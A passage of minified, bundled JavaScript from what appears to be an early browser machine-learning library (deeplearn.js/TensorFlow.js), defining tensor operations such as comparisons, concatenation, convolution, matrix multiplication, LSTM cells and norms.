i=t("../doc"),o=t("../environment"),s=t("../util"),a=t("./broadcast_util"),u=t("./operation"),c=function(){function t(){}return t.notEqual=function(t,e){return s.assertTypesMatch(t,e),a.assertAndGetBroadcastShape(t.shape,e.shape),o.ENV.engine.runKernel((function(n){return n.notEqual(t,e)}),{a:t,b:e})},t.notEqualStrict=function(t,e){return s.assertShapesMatch(t.shape,e.shape,"Error in notEqualStrict: "),t.notEqual(e)},t.less=function(t,e){return s.assertTypesMatch(t,e),a.assertAndGetBroadcastShape(t.shape,e.shape),o.ENV.engine.runKernel((function(n){return n.less(t,e)}),{a:t,b:e})},t.lessStrict=function(t,e){return s.assertShapesMatch(t.shape,e.shape,"Error in lessStrict: "),t.less(e)},t.equal=function(t,e){return s.assertTypesMatch(t,e),a.assertAndGetBroadcastShape(t.shape,e.shape),o.ENV.engine.runKernel((function(n){return n.equal(t,e)}),{a:t,b:e})},t.equalStrict=function(t,e){return s.assertShapesMatch(t.shape,e.shape,"Error in equalStrict: "),t.equal(e)},t.lessEqual=function(t,e){return s.assertTypesMatch(t,e),a.assertAndGetBroadcastShape(t.shape,e.shape),o.ENV.engine.runKernel((function(n){return n.lessEqual(t,e)}),{a:t,b:e})},t.lessEqualStrict=function(t,e){return s.assertShapesMatch(t.shape,e.shape,"Error in lessEqualStrict: "),t.lessEqual(e)},t.greater=function(t,e){return s.assertTypesMatch(t,e),a.assertAndGetBroadcastShape(t.shape,e.shape),o.ENV.engine.runKernel((function(n){return n.greater(t,e)}),{a:t,b:e})},t.greaterStrict=function(t,e){return s.assertShapesMatch(t.shape,e.shape,"Error in greaterStrict: "),t.greater(e)},t.greaterEqual=function(t,e){return s.assertTypesMatch(t,e),a.assertAndGetBroadcastShape(t.shape,e.shape),o.ENV.engine.runKernel((function(n){return n.greaterEqual(t,e)}),{a:t,b:e})},t.greaterEqualStrict=function(t,e){return s.assertShapesMatch(t.shape,e.shape,"Error in greaterEqualStrict: "),t.greaterEqual(e)},r([i.doc({heading:"Operations",subheading:"Logical"}),u.operation],t,"notEqual",null),r([u.operation],t,"notEqualStrict",null),r([i.doc({heading:"Operations",subheading:"Logical"}),u.operation],t,"less",null),r([u.operation],t,"lessStrict",null),r([i.doc({heading:"Operations",subheading:"Logical"}),u.operation],t,"equal",null),r([u.operation],t,"equalStrict",null),r([i.doc({heading:"Operations",subheading:"Logical"}),u.operation],t,"lessEqual",null),r([u.operation],t,"lessEqualStrict",null),r([i.doc({heading:"Operations",subheading:"Logical"}),u.operation],t,"greater",null),r([u.operation],t,"greaterStrict",null),r([i.doc({heading:"Operations",subheading:"Logical"}),u.operation],t,"greaterEqual",null),r([u.operation],t,"greaterEqualStrict",null),t}();n.CompareOps=c},{"../doc":25,"../environment":27,"../util":143,"./broadcast_util":101,"./operation":113}],103:[function(t,e,n){"use strict";var r=this&&this.__decorate||function(t,e,n,r){var i,o=arguments.length,s=o<3?e:null===r?r=Object.getOwnPropertyDescriptor(e,n):r;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(i=t[a])&&(s=(o<3?i(s):o>3?i(e,n,s):i(e,n))||s);return o>3&&s&&Object.defineProperty(e,n,s),s};Object.defineProperty(n,"__esModule",{value:!0});var i=t("../doc"),o=t("../environment"),s=t("../util"),a=t("./axis_util"),u=t("./concat_util"),c=t("./operation"),l=function(){function t(){}return t.concat1d=function(e){return t.concat(e,0)},t.concat2d=function(e,n){return t.concat(e,n)},t.concat3d=function(e,n){return t.concat(e,n)},t.concat4d=function(e,n){return t.concat(e,n)},t.concat=function(t,e){void 0===e&&(e=0),s.assert(t.length>=2,"Pass at least two tensors to concat");for(var n=t[0],r=a.parseAxisParam(e,n.shape),i=1;i<t.length;++i)n=h(n,t[i],r[0]);return n},r([i.doc({heading:"Tensors",subheading:"Slicing and Joining"}),c.operation],t,"concat",null),t}();function h(t,e,n){u.assertParams(t.shape,e.shape,n);var r=u.computeOutShape(t.shape,e.shape,n),i=t.as2D(-1,s.sizeFromShape(t.shape.slice(n))),a=e.as2D(-1,s.sizeFromShape(e.shape.slice(n))),c=u.computeGradientSliceShapes(i.shape,a.shape),l=c.aBegin,h=c.aSize,p=c.bBegin,d=c.bSize;return o.ENV.engine.runKernel((function(t){return t.concat(i,a)}),{a:i,b:a},(function(t){return{a:function(){return t.slice(l,h)},b:function(){return t.slice(p,d)}}})).reshape(r)}n.ConcatOps=l},{"../doc":25,"../environment":27,"../util":143,"./axis_util":98,"./concat_util":104,"./operation":113}],104:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("../util");n.assertParams=function(t,e,n){var i=t.length,o=e.length;r.assert(t.length===e.length,"Error in concat"+i+"D: rank of x1 ("+i+") and x2 ("+o+") must be the same."),r.assert(n>=0&&n<i,"Error in concat"+i+"D: axis must be between 0 and "+(i-1)+".");for(var s=0;s<i;s++)r.assert(s===n||t[s]===e[s],"Error in concat"+i+"D: Shape ("+t+") does not match ("+e+") along the non-concatenated axis "+s+".")},n.computeOutShape1D=function(t,e){r.assert(1===t.length&&1===e.length,"x1 and x2 should be 1d array.");var n=t.slice();return n[0]+=e[0],n},n.computeOutShape=function(t,e,n){r.assert(t.length===e.length,"x1 and x2 should have the same rank.");var i=t.slice();return i[n]+=e[n],i},n.computeGradientSliceShapes=function(t,e){return{aBegin:[0,0],aSize:t,bBegin:[0,t[1]],bSize:e}}},{"../util":143}],105:[function(t,e,n){"use strict";var r=this&&this.__decorate||function(t,e,n,r){var i,o=arguments.length,s=o<3?e:null===r?r=Object.getOwnPropertyDescriptor(e,n):r;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(i=t[a])&&(s=(o<3?i(s):o>3?i(e,n,s):i(e,n))||s);return o>3&&s&&Object.defineProperty(e,n,s),s};Object.defineProperty(n,"__esModule",{value:!0});var i=t("../doc"),o=t("../environment"),s=t("../util"),a=t("./conv_util"),u=t("./operation"),c=function(){function t(){}return t.conv1d=function(e,n,r,i,o){var a=e,u=!1;2===e.rank&&(u=!0,a=e.as3D(1,e.shape[0],e.shape[1])),s.assert(3===a.rank,"Error in conv1d: input must be rank 3, but got rank "+a.rank+"."),s.assert(3===n.rank,"Error in conv1d: filter must be rank 3, but got rank "+n.rank+"."),null!=o&&s.assert(s.isInt(i),"Error in conv1d: pad must be an integer when using, dimRoundingMode "+o+" but got pad "+i+"."),s.assert(a.shape[2]===n.shape[1],"Error in conv1d: depth of input ("+a.shape[2]+") must match  input depth for filter "+n.shape[1]+".");var c=n.as4D(1,n.shape[0],n.shape[1],n.shape[2]),l=a.as4D(a.shape[0],1,a.shape[1],a.shape[2]),h=[1,r],p=t.conv2d(l,c,h,i,o);return u?p.as2D(p.shape[2],p.shape[3]):p.as3D(p.shape[0],p.shape[2],p.shape[3])},t.conv2d=function(e,n,r,i,u){var c=e,l=!1;3===e.rank&&(l=!0,c=e.as4D(1,e.shape[0],e.shape[1],e.shape[2])),s.assert(4===c.rank,"Error in conv2d: input must be rank 4, but got rank "+c.rank+"."),s.assert(4===n.rank,"Error in conv2d: filter must be rank 4, but got rank "+n.rank+"."),null!=u&&s.assert(s.isInt(i),"Error in conv2d: pad must be an integer when using, dimRoundingMode "+u+" but got pad "+i+"."),s.assert(c.shape[3]===n.shape[2],"Error in conv2d: depth of input ("+c.shape[3]+") must match  input depth for filter "+n.shape[2]+".");var h=a.computeConv2DInfo(c.shape,n.shape,r,1,i,u),p=o.ENV.engine.runKernel((function(t){return t.conv2d(c,n,h)}),{x:c,filter:n},(function(e){return{x:function(){return t.conv2dDerInput(c.shape,e,n,r,i)},filter:function(){return t.conv2dDerFilter(c,e,n.shape,r,i)}}}));return l?p.as3D(p.shape[1],p.shape[2],p.shape[3]):p},t.conv2dDerInput=function(t,e,n,r,i,u){s.assert(t.length===e.rank,"Length of inShape ("+t.length+") and rank of dy ("+e.rank+") must match");var c=t,l=e,h=!1;3===e.rank&&(h=!0,l=e.as4D(1,e.shape[0],e.shape[1],e.shape[2]),c=[1,t[0],t[1],t[2]]);var p=c[3],d=l.shape[3];s.assert(4===c.length,"Error in conv2dDerInput: inShape must be length 4, but got length "+c.length+"."),s.assert(4===l.rank,"Error in conv2dDerInput: dy must be rank 4, but got rank "+l.rank),s.assert(4===n.rank,"Error in conv2dDerInput: filter must be rank 4, but got rank "+n.rank),s.assert(p===n.shape[2],"Error in conv2dDerInput: depth of input ("+p+") must match input depth for filter "+n.shape[2]+"."),s.assert(d===n.shape[3],"Error in conv2dDerInput: depth of output ("+d+") mustmatch output depth for filter "+n.shape[3]+"."),null!=u&&s.assert(s.isInt(i),"Error in conv2dDerInput: pad must be an integer when using, dimRoundingMode "+u+" but got pad "+i+".");var f=a.computeConv2DInfo(c,n.shape,r,1,i,u),y=o.ENV.engine.runKernel((function(t){return t.conv2dDerInput(l,n,f)}),{dy4D:l});return h?y.as3D(y.shape[1],y.shape[2],y.shape[3]):y},t.conv2dDerFilter=function(t,e,n,r,i,u){var c=t;3===t.rank&&(c=t.as4D(1,t.shape[0],t.shape[1],t.shape[2]));var l=e;3===l.rank&&(l=e.as4D(1,e.shape[0],e.shape[1],e.shape[2])),s.assert(4===c.rank,"Error in conv2dDerFilter: input must be rank 4, but got shape "+c.shape+"."),s.assert(4===l.rank,"Error in conv2dDerFilter: dy must be rank 4, but got shape "+l.shape+"."),s.assert(4===n.length,"Error in conv2dDerFilter: filterShape must be length 4, but got "+n+"."),s.assert(c.shape[3]===n[2],"Error in conv2dDerFilter: depth of input "+c.shape[3]+") must match input depth in filter ("+n[2]+"."),s.assert(l.shape[3]===n[3],"Error in conv2dDerFilter: depth of dy ("+l.shape[3]+") must match output depth for filter ("+n[3]+")."),null!=u&&s.assert(s.isInt(i),"Error in conv2dDerFilter: pad must be an integer when using, dimRoundingMode "+u+" but got pad "+i+".");var h=a.computeConv2DInfo(c.shape,n,r,1,i,u);return o.ENV.engine.runKernel((function(t){return t.conv2dDerFilter(c,l,h)}),{x4D:c,dy4D:l})},t.conv2dTranspose=function(e,n,r,i,o,s){return t.conv2dDerInput(r,e,n,i,o,s)},t.depthwiseConv2d=function(t,e,n,r,i,u){void 0===i&&(i=[1,1]);var c=t,l=!1;3===t.rank&&(l=!0,c=t.as4D(1,t.shape[0],t.shape[1],t.shape[2])),s.assert(4===c.rank,"Error in depthwiseConv2D: input must be rank 4, but got rank "+c.rank+"."),s.assert(4===e.rank,"Error in depthwiseConv2D: filter must be rank 4, but got rank "+e.rank+"."),s.assert(c.shape[3]===e.shape[2],"Error in depthwiseConv2D: number of input channels ("+c.shape[3]+") must match the inChannels dimension in filter "+e.shape[2]+"."),null==i&&(i=[1,1]);var h,p="number"==typeof(h=i)?[h,h]:h,d=p[0],f=p[1];s.assert(1===d&&1===f,"Error in depthwiseConv2D: dilation rates greater than 1 are not yet supported. Got dilations '"+i+"'"),null!=u&&s.assert(s.isInt(r),"Error in depthwiseConv2D: pad must be an integer when using, dimRoundingMode "+u+" but got pad "+r+".");var y=a.computeConv2DInfo(c.shape,e.shape,n,i,r,u,!0),m=o.ENV.engine.runKernel((function(t){return t.depthwiseConv2D(c,e,y)}),{input4D:c,filter:e});return l?m.as3D(m.shape[1],m.shape[2],m.shape[3]):m},r([i.doc({heading:"Operations",subheading:"Convolution"}),u.operation],t,"conv1d",null),r([i.doc({heading:"Operations",subheading:"Convolution"}),u.operation],t,"conv2d",null),r([u.operation],t,"conv2dDerInput",null),r([u.operation],t,"conv2dDerFilter",null),r([i.doc({heading:"Operations",subheading:"Convolution"}),u.operation],t,"conv2dTranspose",null),r([i.doc({heading:"Operations",subheading:"Convolution"}),u.operation],t,"depthwiseConv2d",null),t}();n.ConvOps=c},{"../doc":25,"../environment":27,"../util":143,"./conv_util":106,"./operation":113}],106:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("../util");function i(t,e,n,r,i,s,c,l){void 0===c&&(c=!1),void 0===l&&(l="channelsLast");var h=[-1,-1,-1,-1],p=h[0],d=h[1],f=h[2],y=h[3];if("channelsLast"===l)p=t[0],d=t[1],f=t[2],y=t[3];else{if("channelsFirst"!==l)throw new Error("Unknown dataFormat "+l);p=t[0],y=t[1],d=t[2],f=t[3]}var m,v=e[0],g=e[1],_=e[3],b=a(n),w=b[0],x=b[1],T=a(r),S=T[0],O=T[1],E=function(t,e,n,r,i,s,a,u){var c,l,h;if("number"==typeof t){c={top:t,bottom:t,left:t,right:t};var p=o([e,n,1],s,1,r,t,u);l=p[0],h=p[1]}else if("same"===t){var d=((l=Math.ceil(e/r))-1)*r+s-e,f=((h=Math.ceil(n/i))-1)*i+a-n,y=Math.floor(d/2),m=d-y,v=Math.floor(f/2);c={top:y,bottom:m,left:v,right:f-v}}else{if("valid"!==t)throw Error("Unknown padding parameter: "+t);c={top:0,bottom:0,left:0,right:0},l=Math.ceil((e-s+1)/r),h=Math.ceil((n-a+1)/i)}return{padInfo:c,outHeight:l,outWidth:h}}(i,d,f,w,x,u(v,S),u(g,O),s),A=E.padInfo,k=E.outHeight,P=E.outWidth,M=c?_*y:_;return"channelsFirst"===l?m=[p,M,k,P]:"channelsLast"===l&&(m=[p,k,P,M]),{batchSize:p,dataFormat:l,inHeight:d,inWidth:f,inChannels:y,outHeight:k,outWidth:P,outChannels:M,padInfo:A,strideHeight:w,strideWidth:x,filterHeight:v,filterWidth:g,inShape:t,outShape:m,filterShape:e}}function o(t,e,n,i,o,a){null==o&&(o=s(t,e,i));var u=t[0],l=t[1],h=c((u-e+2*o)/i+1,a);r.assert(r.isInt(h),"The output # of rows ("+h+") must be an integer. Change the stride and/or zero pad parameters");var p=c((l-e+2*o)/i+1,a);return r.assert(r.isInt(p),"The output # of columns ("+p+") must be an integer. Change the stride and/or zero pad parameters"),[h,p,n]}function s(t,e,n){return Math.floor((t[0]*(n-1)-n+e)/2)}function a(t){return"number"==typeof t?[t,t]:t}function u(t,e){return e<=1?t:t+(t-1)*(e-1)}function c(t,e){if(!e)return t;switch(e){case"round":return Math.round(t);case"ceil":return Math.ceil(t);case"floor":return Math.floor(t);default:throw new Error("Unknown roundingMode "+e)}}n.computePool2DInfo=function(t,e,n,r,o,s){void 0===s&&(s="channelsLast");var u,c=a(e),l=c[0],h=c[1];if("channelsLast"===s)u=[l,h,t[3],t[3]];else{if("channelsFirst"!==s)throw new Error("Unknown dataFormat "+s);u=[l,h,t[1],t[1]]}return i(t,u,n,1,r,o,!1,s)},n.computeConv2DInfo=i,n.computeOutputShape3D=o,n.computeDefaultPad=s,n.computeWeightsShape4D=function(t,e,n,r){return[n,r,t,e]},n.computeDilatedRC=function(t,e){return[(t[0]-1)*e+1,(t[1]-1)*e+1]}},{"../util":143}],107:[function(t,e,n){"use strict";var r=this&&this.__decorate||function(t,e,n,r){var i,o=arguments.length,s=o<3?e:null===r?r=Object.getOwnPropertyDescriptor(e,n):r;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(i=t[a])&&(s=(o<3?i(s):o>3?i(e,n,s):i(e,n))||s);return o>3&&s&&Object.defineProperty(e,n,s),s};Object.defineProperty(n,"__esModule",{value:!0});var i=t("../doc"),o=t("../environment"),s=t("../util"),a=t("./operation"),u=function(){function t(){}return t.resizeBilinear=function(t,e,n){void 0===n&&(n=!1),s.assert(3===t.rank||4===t.rank,"Error in resizeBilinear: x must be rank 3 or 4, but got rank "+t.rank+"."),s.assert(2===e.length,"Error in resizeBilinear: new shape must 2D, but got shape "+e+".");var r=t,i=!1;3===t.rank&&(i=!0,r=t.as4D(1,t.shape[0],t.shape[1],t.shape[2]));var a=e[0],u=e[1],c=o.ENV.engine.runKernel((function(t){return t.resizeBilinear(r,a,u,n)}),{batchImages:r});return i?c.as3D(c.shape[1],c.shape[2],c.shape[3]):c},r([i.doc({heading:"Operations",subheading:"Images",namespace:"image"}),a.operation],t,"resizeBilinear",null),t}();n.ImageOps=u},{"../doc":25,"../environment":27,"../util":143,"./operation":113}],108:[function(t,e,n){"use strict";var r=this&&this.__decorate||function(t,e,n,r){var i,o=arguments.length,s=o<3?e:null===r?r=Object.getOwnPropertyDescriptor(e,n):r;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(i=t[a])&&(s=(o<3?i(s):o>3?i(e,n,s):i(e,n))||s);return o>3&&s&&Object.defineProperty(e,n,s),s};Object.defineProperty(n,"__esModule",{value:!0});var i=t("../doc"),o=t("../environment"),s=t("../types"),a=t("../util"),u=t("./broadcast_util"),c=t("./operation"),l=function(){function t(){}return t.logicalNot=function(t){return a.assert("bool"===t.dtype,"Error Array must be of type bool."),o.ENV.engine.runKernel((function(e){return e.logicalNot(t)}),{x:t})},t.logicalAnd=function(t,e){return a.assert("bool"===t.dtype&&"bool"===e.dtype,"Error Array must be of type bool."),u.assertAndGetBroadcastShape(t.shape,e.shape),o.ENV.engine.runKernel((function(n){return n.logicalAnd(t,e)}),{a:t,b:e})},t.logicalOr=function(t,e){return a.assert("bool"===t.dtype&&"bool"===e.dtype,"Error Array must be of type bool."),u.assertAndGetBroadcastShape(t.shape,e.shape),o.ENV.engine.runKernel((function(n){return n.logicalOr(t,e)}),{a:t,b:e})},t.logicalXor=function(t,e){return a.assert("bool"===t.dtype&&"bool"===e.dtype,"Error Array must be of type bool."),u.assertAndGetBroadcastShape(t.shape,e.shape),o.ENV.engine.runKernel((function(n){return n.logicalXor(t,e)}),{a:t,b:e})},t.where=function(t,e,n){a.assert("bool"===t.dtype||"bool"===e.dtype||"bool"===n.dtype,"Error Array must be of type bool."),a.assertShapesMatch(e.shape,n.shape,"Error in where: "),1===t.rank?a.assert(t.shape[0]===e.shape[0],"The first dimension of `a` must match the size of `condition`."):a.assertShapesMatch(t.shape,n.shape,"Error in where: ");var r=s.upcastType(e.dtype,n.dtype);return o.ENV.engine.runKernel((function(i){return i.where(t,e,n,r)}),{condition:t,a:e,b:n})},r([i.doc({heading:"Operations",subheading:"Logical"}),c.operation],t,"logicalNot",null),r([i.doc({heading:"Operations",subheading:"Logical"}),c.operation],t,"logicalAnd",null),r([i.doc({heading:"Operations",subheading:"Logical"}),c.operation],t,"logicalOr",null),r([i.doc({heading:"Operations",subheading:"Logical"}),c.operation],t,"logicalXor",null),r([i.doc({heading:"Operations",subheading:"Logical"}),c.operation],t,"where",null),t}();n.LogicalOps=l},{"../doc":25,"../environment":27,"../types":142,"../util":143,"./broadcast_util":101,"./operation":113}],109:[function(t,e,n){"use strict";var r=this&&this.__decorate||function(t,e,n,r){var i,o=arguments.length,s=o<3?e:null===r?r=Object.getOwnPropertyDescriptor(e,n):r;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(i=t[a])&&(s=(o<3?i(s):o>3?i(e,n,s):i(e,n))||s);return o>3&&s&&Object.defineProperty(e,n,s),s};Object.defineProperty(n,"__esModule",{value:!0});var i=t("../doc"),o=t("../environment"),s=t("../util"),a=t("./operation"),u=function(){function t(){}return t.localResponseNormalization=function(t,e,n,r,i,a){void 0===e&&(e=5),void 0===n&&(n=1),void 0===r&&(r=1),void 0===i&&(i=.5),void 0===a&&(a="acrossChannels"),s.assert(4===t.rank||3===t.rank,"Error in localResponseNormalization: x must be rank 3 or 4 but got\n               rank "+t.rank+"."),s.assert(s.isInt(e),"Error in localResponseNormalization3D: radius must be an integer\n                     but got radius "+e+".");var u=t,c=!1;3===t.rank&&(c=!0,u=t.as4D(1,t.shape[0],t.shape[1],t.shape[2]));var l=o.ENV.engine.runKernel((function(t){return t.localResponseNormalization4D(u,e,n,r,i,a)}),{x4D:u});return c?l.as3D(l.shape[1],l.shape[2],l.shape[3]):l},r([i.doc({heading:"Operations",subheading:"Normalization"}),a.operation],t,"localResponseNormalization",null),t}();n.LRNOps=u},{"../doc":25,"../environment":27,"../util":143,"./operation":113}],110:[function(t,e,n){"use strict";var r=this&&this.__decorate||function(t,e,n,r){var i,o=arguments.length,s=o<3?e:null===r?r=Object.getOwnPropertyDescriptor(e,n):r;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(i=t[a])&&(s=(o<3?i(s):o>3?i(e,n,s):i(e,n))||s);return o>3&&s&&Object.defineProperty(e,n,s),s};Object.defineProperty(n,"__esModule",{value:!0});var i=t("../doc"),o=t("./operation"),s=function(){function t(){}return t.multiRNNCell=function(t,e,n,r){for(var i=e,o=[],s=0;s<t.length;s++){var a=t[s](i,n[s],r[s]);o.push(a[0]),o.push(a[1]),i=a[1]}var u=[],c=[];for(s=0;s<o.length;s+=2)u.push(o[s]),c.push(o[s+1]);return[u,c]},t.basicLSTMCell=function(t,e,n,r,i,o){var s=r.concat(o,1).matMul(e).add(n),a=s.shape[0],u=s.shape[1]/4,c=[a,u],l=s.slice([0,0],c),h=s.slice([0,u],c),p=s.slice([0,2*u],c),d=s.slice([0,3*u],c),f=l.sigmoid().mulStrict(h.tanh()).addStrict(i.mulStrict(t.add(p).sigmoid())),y=f.tanh().mulStrict(d.sigmoid());return[f,y]},r([i.doc({heading:"Operations",subheading:"RNN"}),o.operation],t,"multiRNNCell",null),r([i.doc({heading:"Operations",subheading:"RNN"}),o.operation],t,"basicLSTMCell",null),t}();n.LSTMOps=s},{"../doc":25,"./operation":113}],111:[function(t,e,n){"use strict";var r=this&&this.__decorate||function(t,e,n,r){var i,o=arguments.length,s=o<3?e:null===r?r=Object.getOwnPropertyDescriptor(e,n):r;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(i=t[a])&&(s=(o<3?i(s):o>3?i(e,n,s):i(e,n))||s);return o>3&&s&&Object.defineProperty(e,n,s),s};Object.defineProperty(n,"__esModule",{value:!0});var i,o=t("../doc"),s=t("../environment"),a=t("../util"),u=t("./operation");!function(t){t[t.REGULAR=0]="REGULAR",t[t.TRANSPOSED=1]="TRANSPOSED"}(i=n.MatrixOrientation||(n.MatrixOrientation={}));var c=function(){function t(){}return t.matMul=function(t,e,n,r){void 0===n&&(n=!1),void 0===r&&(r=!1),u=[l(n),l(r)],r=u[1];var i=(n=u[0])?t.shape[0]:t.shape[1],o=r?e.shape[1]:e.shape[0];a.assert(2===t.rank&&2===e.rank,"Error in matMul: inputs must be rank 2, got ranks "+t.rank+" and "+e.rank+"."),a.assert(i===o,"Error in matMul: inner shapes ("+i+") and ("+o+") of Tensors with shapes "+t.shape+" and "+e.shape+" and transposeA="+n+" and transposeB="+r+" must match.");var u;return s.ENV.engine.runKernel((function(i){return i.matMul(t,e,n,r)}),{a:t,b:e},(function(i){if(n||r)throw new Error("Backprop for transposed MatMul not yet implemented.");return{a:function(){return i.matMul(e.toFloat(),!1,!0)},b:function(){return t.toFloat().matMul(i,!0,!1)}}}))},t.vectorTimesMatrix=function(t,e){return a.assert(1===t.rank,"Error in vectorTimesMatrix: first input must be rank 1, but got rank "+t.rank+"."),a.assert(2===e.rank,"Error in vectorTimesMatrix: second input must be rank 2, but got rank "+e.rank+"."),a.assert(t.size===e.shape[0],"Error in vectorTimesMatrix: size of vector ("+t.size+") must match first dimension of matrix ("+e.shape[0]+")"),t.as2D(1,-1).matMul(e).as1D()},t.matrixTimesVector=function(t,e){return a.assert(1===e.rank,"Error in matrixTimesVector: second input must rank 1, but got rank "+e.rank+"."),a.assert(2===t.rank,"Error in matrixTimesVector: first input must be a rank 2, but got rank "+t.rank+"."),a.assert(e.size===t.shape[1],"Error in matrixTimesVector: size of first rank 1 input "+e.size+" must match inner dimension of second rank 2 input, but got shape "+t.shape+"."),t.matMul(e.as2D(-1,1)).as1D()},t.dotProduct=function(t,e){return a.assert(1===t.rank&&1===e.rank,"Error in dotProduct: inputs must be rank 1, but got ranks "+t.rank+" and "+e.rank+"."),a.assert(t.size===e.size,"Error in dotProduct: size of inputs ("+t.size+") and ("+e.size+") must match."),t.as2D(1,-1).matMul(e.as2D(-1,1)).asScalar()},t.outerProduct=function(t,e){return a.assert(1===t.rank&&1===e.rank,"Error in outerProduct: inputs must be rank 1, but got ranks "+t.rank+" and "+e.rank+"."),t.as2D(-1,1).matMul(e.as2D(1,-1))},r([o.doc({heading:"Operations",subheading:"Matrices"}),u.operation],t,"matMul",null),r([u.operation],t,"vectorTimesMatrix",null),r([u.operation],t,"matrixTimesVector",null),r([u.operation],t,"dotProduct",null),r([o.doc({heading:"Operations",subheading:"Matrices"}),u.operation],t,"outerProduct",null),t}();function l(t){return t!==i.REGULAR&&(t===i.TRANSPOSED||t)}n.MatmulOps=c},{"../doc":25,"../environment":27,"../util":143,"./operation":113}],112:[function(t,e,n){"use strict";var r=this&&this.__decorate||function(t,e,n,r){var i,o=arguments.length,s=o<3?e:null===r?r=Object.getOwnPropertyDescriptor(e,n):r;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(i=t[a])&&(s=(o<3?i(s):o>3?i(e,n,s):i(e,n))||s);return o>3&&s&&Object.defineProperty(e,n,s),s};Object.defineProperty(n,"__esModule",{value:!0});var i=t("../doc"),o=t("./axis_util"),s=t("./operation"),a=t("./ops"),u=function(){function t(){}return t.norm=function(t,e,n,r){void 0===e&&(e="euclidean"),void 0===n&&(n=null),void 0===r&&(r=!1);var i=c(t,e,n),s=i.shape;if(r){var a=o.parseAxisParam(n,t.shape);s=o.expandShapeToKeepDim(i.shape,a)}return i.reshape(s)},r([i.doc({heading:"Operations",subheading:"Matrices"}),s.operation],t,"norm",null),t}();function c(t,e,n){if(void 0===n&&(n=null),0===t.rank)return t.abs();if(1!==t.rank&&null===n)return c(t.reshape([-1]),e,n);if(1===t.rank||"number"==typeof n||n instanceof Array&&1===n.length){if(1===e)return t.abs().sum(n);if(e===1/0)return t.abs().max(n);if(e===-1/0)return t.abs().min(n);if("euclidean"===e||2===e)return t.abs().pow(a.scalar(2,"int32")).sum(n).sqrt();throw new Error("Error in norm: invalid ord value: "+e)}if(n instanceof Array&&2===n.length){if(1===e)return t.abs().sum(n[0]).max(n[1]-1);if(e===1/0)return t.abs().sum(n[1]).max(n[0]);if(e===-1/0)return t.abs().sum(n[1]).min(n[0]);if("fro"===e||"euclidean"===e)return t.square().sum(n).sqrt();throw new Error("Error in norm: invalid ord value: "+e)}throw new Error("Error in norm: invalid axis: "+n)}n.NormOps=u},{"../doc":25,"./axis_util":98,"./operation":113,"./ops":114}],113:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("../globals");n.operation=function(t,e,n){var i=n.value;return n.value=function(){for(var t=[],n=0;n<arguments.length;n++)t[n]=arguments[n];return r.tidy(e,(function(){return i.apply(void 0,t)}))},n}},{"../globals":28}],114:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("./array_ops"),i=t("./batchnorm"),o=t("./binary_ops"),s=t("./compare"),a=t("./concat"),u=t("./conv"),c=t("./image_ops"),l=t("./logical_ops"),h=t("./lrn"),p=t("./lstm"),d=t("./matmul"),f=t("./norm"),y=t("./pool"),m=t("./reduction_ops"),v=t("./reverse"),g=t("./slice"),_=t("./softmax"),b=t("./transpose"),w=t("./unary_ops");n.batchNormalization=i.BatchNormOps.batchNormalization,n.batchNormalization2d=i.BatchNormOps.batchNormalization2d,n.batchNormalization3d=i.BatchNormOps.batchNormalization3d,n.batchNormalization4d=i.BatchNormOps.batchNormalization4d,n.concat=a.ConcatOps.concat,n.concat1d=a.ConcatOps.concat1d,n.concat2d=a.ConcatOps.concat2d,n.concat3d=a.ConcatOps.concat3d,n.concat4d=a.ConcatOps.concat4d,n.conv1d=u.ConvOps.conv1d,n.conv2d=u.ConvOps.conv2d,n.conv2dTranspose=u.ConvOps.conv2dTranspose,n.depthwiseConv2d=u.ConvOps.depthwiseConv2d,n.matMul=d.MatmulOps.matMul,n.matrixTimesVector=d.MatmulOps.matrixTimesVector,n.outerProduct=d.MatmulOps.outerProduct,n.vectorTimesMatrix=d.MatmulOps.vectorTimesMatrix,n.avgPool=y.PoolOps.avgPool,n.maxPool=y.PoolOps.maxPool,n.minPool=y.PoolOps.minPool,n.transpose=b.TransposeOps.transpose,n.reverse=v.ReverseOps.reverse,n.reverse1d=v.ReverseOps.reverse1d,n.reverse2d=v.ReverseOps.reverse2d,n.reverse3d=v.ReverseOps.reverse3d,n.reverse4d=v.ReverseOps.reverse4d,n.slice=g.SliceOps.slice,n.slice1d=g.SliceOps.slice1d,n.slice2d=g.SliceOps.slice2d,n.slice3d=g.SliceOps.slice3d,n.slice4d=g.SliceOps.slice4d,n.argMax=m.ReductionOps.argMax,n.argMin=m.ReductionOps.argMin,n.logSumExp=m.ReductionOps.logSumExp,n.max=m.ReductionOps.max,n.mean=m.ReductionOps.mean,n.min=m.ReductionOps.min,n.moments=m.ReductionOps.moments,n.sum=m.ReductionOps.sum,n.equal=s.CompareOps.equal,n.equalStrict=s.CompareOps.equalStrict,n.greater=s.CompareOps.greater,n.greaterStrict=s.CompareOps.greaterStrict,n.greaterEqual=s.CompareOps.greaterEqual,n.greaterEqualStrict=s.CompareOps.greaterEqualStrict,n.less=s.CompareOps.less,n.lessStrict=s.CompareOps.lessStrict,n.lessEqual=s.CompareOps.lessEqual,n.lessEqualStrict=s.CompareOps.lessEqualStrict,n.notEqual=s.CompareOps.notEqual,n.notEqualStrict=s.CompareOps.notEqualStrict,n.logicalNot=l.